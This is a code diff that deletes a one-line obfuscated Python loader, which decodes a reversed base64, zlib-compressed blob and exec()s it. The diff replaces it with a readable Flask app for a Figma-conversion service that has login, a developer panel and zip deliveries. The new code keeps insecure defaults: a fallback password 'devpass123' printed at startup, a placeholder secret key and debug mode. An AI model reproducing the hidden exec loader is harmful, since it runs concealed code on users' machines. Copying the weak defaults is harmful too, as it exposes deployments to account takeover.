@@ -1,2 +1,260 @@
-# Python obfuscation by pyobfuscator.com
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==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'))
+import json
+import os
+import uuid
+
+from flask import Flask, jsonify, request, send_file, session, redirect
+from werkzeug.security import check_password_hash, generate_password_hash
+
+IS_VERCEL = os.environ.get('VERCEL') == '1'
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+DATA_DIR = '/tmp' if IS_VERCEL else BASE_DIR
+USERS_FILE = os.path.join(DATA_DIR, 'users.json')
+CONVERSIONS_FILE = os.path.join(DATA_DIR, 'conversions.json')
+UPLOADS_DIR = os.path.join(DATA_DIR, 'uploads')
+DEV_EMAIL = 'michaelyoda210@gmail.com'
+DEV_PASSWORD = os.environ.get('DEV_PASSWORD', 'devpass123')
+
+os.makedirs(UPLOADS_DIR, exist_ok=True)
+
+app = Flask(__name__, static_folder=BASE_DIR, static_url_path='')
+app.secret_key = os.environ.get('SECRET_KEY', 'change-this-secret-key-in-production')
+
+
+def seed_dev_user():
+    users = load_json(USERS_FILE, [])
+    if not any(u['email'] == DEV_EMAIL for u in users):
+        users.append({
+            'name': 'Enzo Dev',
+            'email': DEV_EMAIL,
+            'password': generate_password_hash(DEV_PASSWORD),
+        })
+        save_json(USERS_FILE, users)
+        print('Seeded dev account:', DEV_EMAIL, '/', DEV_PASSWORD)
+
+
+def load_json(path, default):
+    if not os.path.exists(path):
+        return default
+    try:
+        with open(path, 'r', encoding='utf-8') as f:
+            return json.load(f)
+    except (json.JSONDecodeError, OSError):
+        return default
+
+
+def save_json(path, data):
+    with open(path, 'w', encoding='utf-8') as f:
+        json.dump(data, f, indent=2, ensure_ascii=False)
+
+
+def current_user():
+    return session.get('user')
+
+
+def is_dev():
+    user = current_user()
+    return user and user.get('email', '').lower() == DEV_EMAIL
+
+
+def auth():
+    return current_user() is not None
+
+
+# ---------------------------------------------------------------------------
+# Static pages
+@app.route('/')
+def index():
+    return send_file(os.path.join(BASE_DIR, 'index.html'))
+
+
+@app.route('/dashboard')
+def dashboard():
+    return send_file(os.path.join(BASE_DIR, 'dashboard.html'))
+
+
+@app.route('/dev')
+def dev():
+    return send_file(os.path.join(BASE_DIR, 'dev.html'))
+
+
+# ---------------------------------------------------------------------------
+# Auth
+@app.route('/api/signup', methods=['POST'])
+def signup():
+    data = request.get_json(silent=True) or {}
+    name = (data.get('name') or '').strip()
+    email = (data.get('email') or '').strip().lower()
+    password = data.get('password') or ''
+
+    if not name or not email or not password:
+        return jsonify({'error': 'Please fill in all fields.'}), 400
+    if '@' not in email:
+        return jsonify({'error': 'Please enter a valid email.'}), 400
+    if len(password) < 6:
+        return jsonify({'error': 'Password must be at least 6 characters.'}), 400
+    if email == DEV_EMAIL:
+        return jsonify({'error': 'That email is reserved and cannot be used.'}), 400
+
+    users = load_json(USERS_FILE, [])
+    if any(u['email'] == email for u in users):
+        return jsonify({'error': 'An account with that email already exists.'}), 400
+
+    users.append({
+        'name': name,
+        'email': email,
+        'password': generate_password_hash(password),
+    })
+    save_json(USERS_FILE, users)
+    return jsonify({'ok': True})
+
+
+@app.route('/api/login', methods=['POST'])
+def login():
+    data = request.get_json(silent=True) or {}
+    email = (data.get('email') or '').strip().lower()
+    password = data.get('password') or ''
+
+    if not email or not password:
+        return jsonify({'error': 'Please enter your email and password.'}), 400
+
+    users = load_json(USERS_FILE, [])
+    user = next((u for u in users if u['email'] == email), None)
+    if not user or not check_password_hash(user['password'], password):
+        return jsonify({'error': 'Wrong email or password.'}), 400
+
+    session['user'] = {'name': user['name'], 'email': user['email']}
+    return jsonify({'ok': True, 'user': {'name': user['name'], 'email': user['email']}})
+
+
+@app.route('/api/logout', methods=['POST'])
+def logout():
+    session.pop('user', None)
+    return jsonify({'ok': True})
+
+
+@app.route('/api/me')
+def me():
+    user = current_user()
+    if not user:
+        return jsonify({'error': 'Not logged in'}), 401
+    return jsonify({'user': user, 'is_dev': is_dev()})
+
+
+# ---------------------------------------------------------------------------
+# Dev panel (only for michaelyoda210@gmail.com)
+@app.route('/api/conversions', methods=['GET'])
+def get_conversions():
+    if not is_dev():
+        return jsonify({'error': 'Forbidden'}), 403
+    return jsonify(load_json(CONVERSIONS_FILE, []))
+
+
+@app.route('/api/conversions', methods=['POST'])
+def add_conversion():
+    if not auth():
+        return jsonify({'error': 'Not logged in'}), 401
+
+    data = request.get_json(silent=True) or {}
+    user = current_user()
+    conversions = load_json(CONVERSIONS_FILE, [])
+
+    conversions.insert(0, {
+        'id': str(uuid.uuid4()),
+        'name': user['name'],
+        'initials': ''.join(p[0] for p in user['name'].split() if p)[:2].upper() or '?',
+        'email': user['email'],
+        'file': data.get('file', 'figma.json'),
+        'data': data.get('data', '{}'),
+        'time': (data.get('time') or ''),
+        'status': 'queued',
+    })
+    save_json(CONVERSIONS_FILE, conversions)
+    return jsonify({'ok': True}), 201
+
+
+@app.route('/api/conversions/<conv_id>/sendback', methods=['POST'])
+def send_back(conv_id):
+    if not is_dev():
+        return jsonify({'error': 'Forbidden'}), 403
+
+    conversions = load_json(CONVERSIONS_FILE, [])
+    for conv in conversions:
+        if conv.get('id') == conv_id:
+            uploaded = request.files.get('file')
+            if uploaded and uploaded.filename:
+                zip_path = os.path.join(UPLOADS_DIR, conv_id + '.zip')
+                uploaded.save(zip_path)
+                conv['zip_name'] = uploaded.filename
+            conv['status'] = 'sent'
+            save_json(CONVERSIONS_FILE, conversions)
+            return jsonify({'ok': True})
+    return jsonify({'error': 'Not found'}), 404
+
+
+@app.route('/api/conversions/<conv_id>/delivery')
+def conversion_delivery(conv_id):
+    if not is_dev():
+        return jsonify({'error': 'Forbidden'}), 403
+
+    conversions = load_json(CONVERSIONS_FILE, [])
+    conv = next((c for c in conversions if c.get('id') == conv_id), None)
+    zip_path = os.path.join(UPLOADS_DIR, conv_id + '.zip')
+    if not conv or not os.path.exists(zip_path):
+        return jsonify({'error': 'Not found'}), 404
+    return send_file(zip_path, as_attachment=True,
+                     download_name=conv.get('zip_name') or 'delivery.zip')
+
+
+@app.route('/api/my-conversions')
+def my_conversions():
+    if not auth():
+        return jsonify({'error': 'Not logged in'}), 401
+
+    email = current_user()['email']
+    conversions = load_json(CONVERSIONS_FILE, [])
+    mine = [{
+        'id': c.get('id'),
+        'file': c.get('file'),
+        'status': c.get('status'),
+        'zip_name': c.get('zip_name'),
+    } for c in conversions if c.get('email') == email]
+    return jsonify(mine)
+
+
+@app.route('/api/conversions/<conv_id>/my-delivery')
+def my_delivery(conv_id):
+    if not auth():
+        return jsonify({'error': 'Not logged in'}), 401
+
+    conversions = load_json(CONVERSIONS_FILE, [])
+    conv = next((c for c in conversions if c.get('id') == conv_id), None)
+    if not conv or conv.get('email') != current_user()['email']:
+        return jsonify({'error': 'Not found'}), 404
+    zip_path = os.path.join(UPLOADS_DIR, conv_id + '.zip')
+    if not os.path.exists(zip_path):
+        return jsonify({'error': 'Not found'}), 404
+    return send_file(zip_path, as_attachment=True,
+                     download_name=conv.get('zip_name') or 'delivery.zip')
+
+
+@app.route('/api/conversions/<conv_id>/download')
+def download_conversion(conv_id):
+    if not is_dev():
+        return jsonify({'error': 'Forbidden'}), 403
+
+    conversions = load_json(CONVERSIONS_FILE, [])
+    conv = next((c for c in conversions if c.get('id') == conv_id), None)
+    if not conv:
+        return jsonify({'error': 'Not found'}), 404
+
+    tmp = os.path.join(DATA_DIR, 'download_' + conv_id + '.json')
+    with open(tmp, 'w', encoding='utf-8') as f:
+        f.write(conv.get('data', '{}'))
+    response = send_file(tmp, as_attachment=True, download_name=conv.get('file', 'figma.json'))
+    response.call_on_close(lambda: os.path.exists(tmp) and os.remove(tmp))
+    return response
+
+
+if __name__ == '__main__':
+    seed_dev_user()
+    app.run(debug=True, port=5000)
